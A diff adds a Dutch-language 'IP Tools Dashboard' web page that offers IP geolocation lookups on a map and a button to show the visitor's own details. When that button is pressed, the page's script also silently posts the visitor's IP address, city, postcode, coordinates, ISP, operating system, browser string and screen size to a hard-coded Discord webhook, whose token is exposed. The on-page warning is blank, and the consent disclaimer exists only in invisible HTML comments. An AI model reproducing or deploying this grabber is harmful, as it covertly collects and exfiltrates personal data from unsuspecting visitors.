@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Tools Dashboard</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1a1a1a;
+      color: #f1f1f1;
+      padding: 20px;
+    }
+    .container {
+      max-width: 800px;
+      margin: auto;
+      background-color: #2a2a2a;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    h2 {
+      text-align: center;
+      color: #00ffff;
+    }
+    input, button {
+      padding: 10px;
+      margin-top: 10px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      background-color: #00ffff;
+      color: #000;
+      cursor: pointer;
+    }
+    #map {
+      height: 300px;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+    .section {
+      margin-top: 30px;
+    }
+    .info {
+      background-color: #333;
+      padding: 15px;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+    .disclaimer {
+      text-align: center;
+      font-size: 11px;
+      color: #888;
+      margin-top: 30px;
+    }
+    .webhook-note {
+      font-size: 12px;
+      color: #bbb;
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>IP Tools Dashboard</h2>
+
+    <!-- IP Tracker -->
+    <div class="section">
+      <h3>🔍 Zoek IP-informatie</h3>
+      <input type="text" id="ipInput" placeholder="Voer een IP-adres in (bv. 8.8.8.8)">
+      <button onclick="zoekIP()">Zoek IP</button>
+      <div id="ipInfo" class="info"></div>
+      <div id="map"></div>
+    </div>
+
+    <!-- Mijn IP en systeeminfo -->
+    <div class="section">
+      <h3>🧠 Jouw Informatie</h3>
+      <button onclick="toonEigenInfo()">Toon mijn gegevens</button>
+      <div id="mijnInfo" class="info"></div>
+      <p class="webhook-note">⚠️ .</p>
+    </div>
+
+    <div class="disclaimer">
+      <!-- DISCLAIMER -->
+      <!-- Deze code mag alleen gebruikt worden met uitdrukkelijke toestemming van de gebruiker. -->
+      <!-- Het versturen van systeem- of IP-gegevens naar externe services (zoals webhooks) zonder toestemming is mogelijk in strijd met privacywetgeving. -->
+      <!-- Zorg dat je altijd transparant bent over dataverwerking. -->
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    let map;
+
+    function zoekIP() {
+      const ip = document.getElementById('ipInput').value.trim();
+      const infoDiv = document.getElementById('ipInfo');
+      infoDiv.innerHTML = 'Laden...';
+
+      fetch(`https://ipapi.co/${ip}/json/`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.error) {
+            infoDiv.innerHTML = '❌ Fout: ' + data.reason;
+            return;
+          }
+
+          infoDiv.innerHTML = `
+            <strong>IP:</strong> ${data.ip}<br>
+            <strong>Land:</strong> ${data.country_name} (${data.country_code})<br>
+            <strong>Regio:</strong> ${data.region}<br>
+            <strong>Stad:</strong> ${data.city}<br>
+            <strong>Postcode:</strong> ${data.postal}<br>
+            <strong>Breedtegraad:</strong> ${data.latitude}<br>
+            <strong>Lengtegraad:</strong> ${data.longitude}<br>
+            <strong>Continent-code:</strong> ${data.continent_code}<br>
+            <strong>ASN:</strong> ${data.asn}<br>
+            <strong>Organisatie (ISP):</strong> ${data.org}<br>
+            <strong>Tijdzone:</strong> ${data.timezone}<br>
+            <strong>Valuta:</strong> ${data.currency}<br>
+            <strong>Taal:</strong> ${data.languages}<br>
+            <strong>Landnummer (telefonie):</strong> ${data.country_calling_code}<br>
+            <strong>EU-lidstaat:</strong> ${data.in_eu ? 'Ja' : 'Nee'}<br>
+          `;
+
+          if (!map) {
+            map = L.map('map').setView([data.latitude, data.longitude], 10);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+          } else {
+            map.setView([data.latitude, data.longitude], 10);
+          }
+
+          L.marker([data.latitude, data.longitude]).addTo(map);
+        })
+        .catch(() => {
+          infoDiv.innerHTML = 'Kon geen data ophalen.';
+        });
+    }
+
+    function toonEigenInfo() {
+      const info = document.getElementById('mijnInfo');
+      info.innerHTML = 'Laden...';
+
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          const screenSize = `${screen.width}x${screen.height}`;
+
+          const content = `
+            Jouw IP: ${data.ip}\n
+            Land: ${data.country_name} (${data.country_code})\n
+            Regio: ${data.region}\n
+            Stad: ${data.city}\n
+            Postcode: ${data.postal}\n
+            Locatie: ${data.latitude}, ${data.longitude}\n
+            Continent-code: ${data.continent_code}\n
+            ASN: ${data.asn}\n
+            Organisatie: ${data.org}\n
+            Tijdzone: ${data.timezone}\n
+            Valuta: ${data.currency}\n
+            Taal: ${data.languages}\n
+            Landnummer: ${data.country_calling_code}\n
+            EU-lidstaat: ${data.in_eu ? 'Ja' : 'Nee'}\n
+            Besturingssysteem: ${navigator.platform}\n
+            Browser: ${navigator.userAgent}\n
+            Resolutie: ${screenSize}\n
+            Lokale Tijdzone: ${timezone}`;
+
+          info.innerHTML = content.replace(/\n/g, '<br>');
+
+          fetch('https://discord.com/api/webhooks/1371872662032220322/cARB5ECTEnd2Spj0jGjPCFfRMVPt-2-tMTOzg5IKWUIwLSBjHduuKxwrCZNJ6OiKTxAu', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              content: content
+            })
+          });
+        })
+        .catch(() => {
+          info.innerHTML = 'Fout bij ophalen van eigen gegevens.';
+        });
+    }
+  </script>
+</body>
+</html>
